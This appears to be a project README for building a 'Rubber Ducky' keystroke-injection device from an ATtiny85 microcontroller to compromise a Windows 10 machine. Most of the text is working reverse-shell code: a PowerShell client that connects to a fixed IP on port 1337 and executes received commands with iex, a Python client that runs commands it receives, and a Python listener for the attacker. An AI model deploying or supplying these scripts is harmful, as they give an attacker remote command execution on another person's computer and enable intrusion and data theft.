# ATtiny85 "Rubber Ducky"
## Creating a rubber ducky from an inexpensive programmable microcontroller to deploy a payload on a patched windows 10 system.

View and Download the [Guide](ATtiny85-Rubber-Ducky-Guide.pdf).

## Reverse Shell Scripts
1. PowerShell (Client): [powershell-client.ps1](01-Shell-Scripts/PowerShell/powershell-client.ps1)

```powershell
// Code written by: Nikhil Mittal, availible @ http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$sm=(New-Object Net.Sockets.TCPClient("192.168.171.129",1337)).GetStream()

[byte[]]$bt=0..255|%{0}

while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0)
    {
        $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i)
        $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1))
        $sm.Write($st,0,$st.Length)
}
```

2. Python (Client): [python-client.py](01-Shell-Scripts/Python/python-client.py)

```python
// Code written by: Abdou Rockikz, availible @ https://www.thepythoncode.com/article/create-reverse-shell-python

import socket
import os
import subprocess
import sys

SERVER_HOST = "192.168.171.129"
SERVER_PORT = 1337
BUFFER_SIZE = 1024 * 128

SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()
```

2. Python (Server): [python-server.py](01-Shell-Scripts/Python/python-server.py)

```python
#!/usr/bin/env python3
// Code written by: Abdou Rockikz, availible @ https://www.thepythoncode.com/article/create-reverse-shell-python

import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 1337
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"[+] Listening on PORT:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"[+] {client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd}> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
    ```
